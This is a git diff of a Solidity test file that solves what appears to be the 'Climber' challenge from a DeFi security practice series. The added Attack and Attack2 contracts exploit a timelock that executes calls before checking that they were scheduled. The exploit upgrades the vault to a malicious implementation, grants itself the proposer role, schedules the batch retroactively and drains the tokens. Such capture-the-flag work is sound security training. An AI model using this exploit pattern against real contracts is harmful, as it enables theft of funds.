@@ -19,7 +19,7 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {
     UUPSUpgradeable
 } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
-
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -100,32 +100,52 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
+        Attack attack = new Attack();
+        Attack2 attack2 = new Attack2();
         address[] memory targets = new address[](3);
         // targets[0] = address(timelock);
         targets[0] = address(vault);
         targets[1] = address(timelock);
-        targets[2] = address(timelock);
+        targets[2] = address(attack2);
         uint256[] memory values = new uint256[](3);
         values[0] = 0;
         values[1] = 0;
         values[2] = 0;
-        Attack attack = new Attack();
+
         bytes[] memory dataElements = new bytes[](3);
+        bytes32 salt = keccak256("salt");
+
         dataElements[0] = abi.encodeCall(
             UUPSUpgradeable.upgradeToAndCall,
             (address(attack), "")
         );
-        dataElements[1] = abi.encodeWithSignature(
-            "grantRole(bytes32,address)",
-            keccak256("PROPOSER_ROLE"),
-            address(timelock)
+        dataElements[1] = abi.encodeCall(
+            AccessControl.grantRole,
+            (keccak256("PROPOSER_ROLE"), address(attack2))
+        );
+        dataElements[2] = abi.encodeCall(
+            Attack2.run,
+            (targets, values, salt, timelock, address(attack))
         );
 
-        bytes32 salt = keccak256("salt");
-        dataElements[2] = abi.encodeCall(
-            timelock.schedule,
-            (targets, values, dataElements, salt)
-        );
+        // bytes[] memory scheduledData = new bytes[](3);
+
+        // scheduledData[
+        //     0
+        // ] = hex"4f1ef286000000000000000000000000ce110ab5927cc46905460d930cca0c6fb466621900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000";
+
+        // scheduledData[
+        //     1
+        // ] = hex"2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f7";
+
+        // scheduledData[
+        //     2
+        // ] = hex"90bd1e6d000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000180a05e334153147e75f3f416139b5109d1179cb56fef6a4ecb4c4cbc92a7c37b7000000000000000000000000000000000000000000000000000000000000000030000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f7000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f70000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000644f1ef286000000000000000000000000ce110ab5927cc46905460d930cca0c6fb4666219000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000442f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000f0c36e5bf7a10debae095410c8b1a6e9501dc0f7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+
+        // dataElements[2] = abi.encodeCall(
+        //     timelock.schedule,
+        //     (targets, values, scheduledData, salt)
+        // );
         // timelock.schedule(targets, values, dataElements, salt);
 
         timelock.execute(targets, values, dataElements, salt);
@@ -153,5 +173,33 @@ contract Attack is UUPSUpgradeable {
             recovery,
             IERC20(token).balanceOf(address(this))
         );
+    }
+}
+contract Attack2 {
+    //   address[] memory targets = new address[](3);
+    //     uint256[] memory values = new uint256[](3);
+    //    bytes32 salt = keccak256("salt");
+    bytes[] dataElements = new bytes[](3);
+
+    function run(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes32 salt,
+        ClimberTimelock timelock,
+        address attack
+    ) public {
+        dataElements[0] = abi.encodeCall(
+            UUPSUpgradeable.upgradeToAndCall,
+            (attack, "")
+        );
+        dataElements[1] = abi.encodeCall(
+            AccessControl.grantRole,
+            (keccak256("PROPOSER_ROLE"), address(this))
+        );
+        dataElements[2] = abi.encodeCall(
+            this.run,
+            (targets, values, salt, timelock,attack)
+        );
+        timelock.schedule(targets, values, dataElements, salt);
     }
 }
